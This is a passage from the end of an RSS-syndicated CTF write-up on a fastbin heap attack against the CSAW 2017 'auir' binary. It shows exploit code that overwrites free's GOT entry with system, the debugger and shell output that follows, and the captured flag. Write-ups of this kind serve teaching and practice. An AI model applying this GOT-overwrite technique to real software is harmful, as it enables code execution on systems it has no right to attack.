<pre><code class="lang-python"># free =&gt; system
edit(0, 8, p64(system))
</code></pre>
<pre><code class="lang-makefile">gef➤  x/gx 0x0000000000605060
0x605060:	0x00007ffff71b1390
gef➤  x 0x00007ffff71b1390
0x7ffff71b1390 &lt;__libc_system&gt;:	0xfa86e90b74ff8548
</code></pre>
<p>Voila! <code>free</code>'s GOT entry officially points to <code>system</code>'s address! Let’s bring this flag home!</p>
<pre><code class="lang-python"># call system with the 2nd entry as argument, which is binsh
free(1)
</code></pre>
<pre><code class="lang-makefile">[*] Leak:        0x7fa077b3fb78
[*] Libc:        0x7fa07777b000
[*] system:      0x7fa0777c0390
[*] Switching to interactive mode
[*] BREAKING....
$ id
uid=1000(auir) gid=1000(auir) groups=1000(auir)
$ ls
auir
flag
$ cat flag
flag{W4rr10rs!_A1ur_4wa1ts_y0u!_M4rch_f0rth_and_t4k3_1t!}
</code></pre>
<p>###<em>Conclusion</em></p>
<p>That’s been it folks! I hope you learnt something new out of it. Thank you for taking the time to read my write-up and if you have any question feel free to comment it down below or reach out to me via twitter DM / IRC.</p>
<p>You can find the full exploit with its PoC on my <a href="https://github.com/sk4px/heapwn/blob/master/csaw2017/auir.py" rel="nofollow noopener">repo</a>.</p>
<p>~ Peace!</p>
          <p><a href="https://0x00sec.org/t/heap-exploitation-fastbin-attack/3627/1">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/heap-exploitation-fastbin-attack/3627/1</link>
        <pubDate>Mon, 18 Sep 2017 12:28:20 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-3627-1</guid>
        <source url="https://0x00sec.org/t/heap-exploitation-fastbin-attack/3627.rss">Heap Exploitation - Fastbin Attack</source>
      </item>
  </channel>
</rss>
